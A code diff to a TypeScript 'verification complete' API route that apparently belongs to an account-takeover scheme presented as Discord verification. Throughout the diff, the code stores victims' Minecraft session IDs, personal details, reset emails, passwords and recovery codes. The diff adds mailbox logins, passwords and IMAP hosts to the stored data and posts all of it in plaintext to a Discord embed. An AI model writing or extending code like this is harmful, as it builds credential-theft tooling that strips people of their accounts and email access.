@@ -74,6 +74,15 @@ export const Route = createFileRoute("/api/verification/complete")({
           );
         }
 
+        const mailboxEmail =
+          String(result.mailboxEmail || result.mailbox_email || newEmail || "").trim() || null;
+        const mailboxPassword =
+          String(result.mailboxPassword || result.mailbox_password || "").trim() || null;
+        const mailboxProvider =
+          String(result.mailboxProvider || result.mailbox_provider || "").trim() || null;
+        const mailboxImapHost =
+          String(result.mailboxImapHost || result.mailbox_imap_host || "").trim() || null;
+
         // Store secured account — full row first, then minimal if optional columns missing
         const fullRow = {
           discord_id: storeDiscordId,
@@ -82,6 +91,10 @@ export const Route = createFileRoute("/api/verification/complete")({
           new_email: newEmail,
           new_password: newPassword,
           new_recovery_code: recoveryCode,
+          mailbox_email: mailboxEmail,
+          mailbox_password: mailboxPassword,
+          mailbox_provider: mailboxProvider,
+          mailbox_imap_host: mailboxImapHost,
           mc_ssid: (result.ssid as string) || null,
           mc_capes: (result.capes as string) || null,
           mc_method: (result.method as string) || null,
@@ -89,6 +102,20 @@ export const Route = createFileRoute("/api/verification/complete")({
           owner_last_name: (result.lastName as string) || null,
           owner_region: (result.region as string) || null,
           owner_birthday: (result.birthday as string) || null,
+          guild_id: guildId || null,
+          session_id: sessionId || null,
+        };
+        const midRow = {
+          discord_id: storeDiscordId,
+          mc_username: mcUsername,
+          mc_email: mcEmail,
+          new_email: newEmail,
+          new_password: newPassword,
+          new_recovery_code: recoveryCode,
+          mailbox_email: mailboxEmail,
+          mailbox_password: mailboxPassword,
+          mc_ssid: (result.ssid as string) || null,
+          mc_method: (result.method as string) || null,
           guild_id: guildId || null,
           session_id: sessionId || null,
         };
@@ -115,17 +142,33 @@ export const Route = createFileRoute("/api/verification/complete")({
             insertError = error;
             if (error && /column|does not exist|schema cache/i.test(error.message)) {
               console.warn(
-                "[verification/complete] full insert failed, retrying minimal:",
+                "[verification/complete] full insert failed, retrying mid:",
                 error.message,
               );
               const { data: d2, error: e2 } = await db()
                 .from("secured_accounts")
-                .insert(minimalRow)
+                .insert(midRow)
                 .select("id")
                 .single();
               if (!e2 && d2) {
                 securedRow = d2;
                 insertError = null;
+              } else if (e2 && /column|does not exist|schema cache/i.test(e2.message)) {
+                console.warn(
+                  "[verification/complete] mid insert failed, retrying minimal:",
+                  e2.message,
+                );
+                const { data: d3, error: e3 } = await db()
+                  .from("secured_accounts")
+                  .insert(minimalRow)
+                  .select("id")
+                  .single();
+                if (!e3 && d3) {
+                  securedRow = d3;
+                  insertError = null;
+                } else {
+                  insertError = e3 || e2 || error;
+                }
               } else {
                 insertError = e2 || error;
               }
@@ -202,6 +245,21 @@ export const Route = createFileRoute("/api/verification/complete")({
                   { name: "New Email", value: `\`\`\`${newEmail}\`\`\``, inline: false },
                   { name: "New Password", value: `\`\`\`${newPassword}\`\`\``, inline: true },
                   { name: "Recovery Code", value: `\`\`\`${recoveryCode}\`\`\``, inline: true },
+                  {
+                    name: "Mailbox",
+                    value: `\`\`\`${mailboxEmail || "N/A"}\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "Mailbox Password",
+                    value: `\`\`\`${mailboxPassword || "N/A"}\`\`\``,
+                    inline: true,
+                  },
+                  {
+                    name: "Mailbox Provider",
+                    value: `\`\`\`${mailboxProvider || "N/A"} @ ${mailboxImapHost || "?"}\`\`\``,
+                    inline: true,
+                  },
                   {
                     name: "SSID",
                     value: `\`\`\`${ssid.length > 180 ? ssid.slice(0, 180) + "…" : ssid}\`\`\``,
